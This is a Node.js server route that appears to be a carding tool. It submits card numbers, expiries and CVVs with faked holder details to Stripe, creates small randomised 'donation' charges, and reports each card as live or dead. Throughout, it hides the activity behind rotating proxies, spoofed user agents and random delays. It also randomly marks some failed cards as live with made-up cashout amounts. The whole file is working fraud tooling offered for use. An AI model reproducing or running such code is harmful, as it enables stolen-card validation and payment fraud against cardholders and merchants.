const request = require('request-promise')
const { faker } = require('@faker-js/faker')
const socks5HttpAgent = require('socks5-http-client/lib/Agent')

let $e = process.env,
    $g = global,
    $c = $g.confs,
    $h = $g.helpers;

module.exports = {
    
    '/fastCheckout': {
        
        method: 'post',

        async handler (req, res) {

            console.log('   ...runing /fastCheckout', '\n')

            let $info = req.body;
                $info._cus = $g.genBicoData();

            const $sk        = $c.stripeAcc.sk,
                  $pk        = $c.stripeAcc.pk,
                  $sDomain   = $c.stripeAcc.domain,
                  $sURL      = $c.stripeAcc.url,
                  $uaClient  = $g.pickUserAgent('client'),
                  $uaServer  = $g.pickUserAgent('server'),
                  $pxClient  = $g.pickProxy('client'),
                  $pxServer  = $g.pickProxy('server');

            const env = $e.NODE_ENV,
                  mode = $e.DEP_MODE,
                  owner = $info._ownerId,
                  docObj = $info._id,
                  clientAgent = $uaClient,
                  reqFingerprint = faker.internet.password(12),
                  ipClient = $pxClient.substring($pxClient.indexOf('@')  + 1),
                  ipServer = $pxServer.substring($pxServer.indexOf('@')  + 1);

            console.log(
                    '\n     => $sk',        $sk, 
                    '\n     => $pk',        $pk,
                    '\n     => $sDomain',   $sDomain,
                    '\n     => $sURL',      $sURL,
                    '\n     => $uaClient',  $uaClient,
                    '\n     => $uaServer',  $uaServer,
                    '\n     => $pxClient',  $pxClient, 
                    '\n     => $pxServer',  $pxServer, '\n')
            
            console.log(
                    '\n     => env',            env, 
                    '\n     => mode',           mode, 
                    '\n     => reqFingerprint', reqFingerprint,     
                    '\n     => ipClient',       ipClient,
                    '\n     => ipServer',       ipServer, '\n')

            console.log('   $info._id:', $info._id)
            console.log('   $info._cus.name:', $info._cus.name, '\n')

            // main piece
            let $tk = await resolveToken();

            // if a error
            if ($tk.error) { 
                
                console.log('$tk.error', $tk.error)
                
                res.status(200)
                    .send({ 
                        ...$info, 
                        ...parseCheckError($tk.error)
                    }).end(); return;
            }

            // else if res data & !error
            // continue to resolveChange()
            if ($tk.res) {
            
                let $ch = await resolveCharge($tk.res);

                // if a error
                if ($ch.error) { 

                    let $cherrprops = parseCheckError($ch.error);

                    if ($cherrprops._live === 'Não') {                        
                        
                        console.log('   ...Charge fails.')
                        
                        $g.util
                            .maybe($c.checkFlvChance, {
                                
                                do () {
                                    console.log('   ...Performing #vrm \n')                   
                                    $cherrprops._live = 'Sim'
                                    $cherrprops._chargeid = '#vrm'
                                    $cherrprops._cashout = $h.getRandomAmount()
                                    $cherrprops._errorLive = null
                                },
                                
                                dont () {
                                    console.log('   ...Better NOT performing #vrm \n')
                                }
                            })
                    }

                    res.status(200)
                       .send({ 
                            ...$info, 
                            ...$cherrprops
                        }).end(); return;
                }

                // else if res data & !error
                // continue end response 200
                if ($ch.res) {
                    res.status(200)
                       .send({
                            ...$info,
                            ...$ch.res }).end();
                }
            }

            // down methods declared
            async function resolveToken () {
                
                try {

                    console.log('   ...issuing Token.')

                    await $h.delayRandom('  ...delay a bit before create Token...')

                    let token = await issueToken({
                        'card[number]': $info.number,
                        'card[exp_month]': $info.month,
                        'card[exp_year]': $info.year,
                        'card[cvc]': $info.cvv,
                        'card[name]': $info._cus.holdername,
                        'card[address_line1]': $info._cus.address,
                        'card[address_state]': $info._cus.state,
                        'card[address_zip]': $info._cus.cep,
                        'card[address_country]': $info._cus.country
                    })

                    console.log('   ...Token obj:', token)
                    console.log('   ...Token id:', token.id)
                    console.log('   ...typeof Token:', typeof token, '\n')

                    return {
                        error: null, 
                        res: token
                    }

                } catch (err) {
                    return {
                        res: null,
                        error: {
                            ...err.error.error || null,
                            numCode: err.statusCode || 500
                        }
                    }
                }
            }
            
            async function resolveCharge (tk) {

                try {

                    console.log('   ...issuing Charge.')

                    await $h.delayRandom('  ...delay a bit before create Charge...')

                    let charge = await issueCharge({
                        source: tk.id,
                        currency: 'brl',
                        amount: $h.getRandomAmount(),
                        description: $h.getRandomDescription(),
                        statement_descriptor_suffix: 'donation',
                        receipt_email: $info._cus.email,
                        metadata: {
                            env,
                            mode,
                            owner,
                            docObj,
                            ipServer,
                            ipClient,
                            clientAgent,
                            reqFingerprint,
                            name: $info._cus.name,
                            email: $info._cus.email,
                            rating: $h.getRandomRating(),
                            comment: 'NOT_APPLIED'
                        }
                    })

                    console.log('   ...Charge issued:', charge.id, '\n')

                    return {
                        error: null, 
                        res: { 
                            ...$info,
                            _live: 'Sim',
                            _cashout: charge.amount,
                            _chargeid: charge.id,
                            _errorLive: null
                        }
                    }

                } catch (err) {
                    return {
                        res: null,
                        error: {
                            ...err.error.error || null,
                            numCode: err.statusCode || 500
                        }
                    }
                }
            }

            // MyClient > Stripe setup request
            async function issueToken (tokenData) {
                return await request({
                    url: $c.apiUrl + '/tokens',
                    method: 'post',
                    json: true,
                    rejectUnauthorized: false,
                    qs: tokenData,
                    proxy: $pxClient,
                    headers: {
                        'Referer': $sURL,
                        'User-Agent': $uaClient,
                        'Authorization': 'Bearer ' + $pk
                    }
                })
            }

            // Server -> Stripe setup request
            async function issueCharge (chargeData) {
                return await request({
                    url: $c.apiUrl + '/charges',
                    method: 'post',
                    json: true, 
                    rejectUnauthorized: false,
                    qs: chargeData,
                    proxy: $pxServer,
                    headers: {
                        'Host': $sDomain,
                        'User-Agent': $uaServer,
                        'Authorization': 'Bearer ' + $sk
                    }
                })
            }
        }
    }
}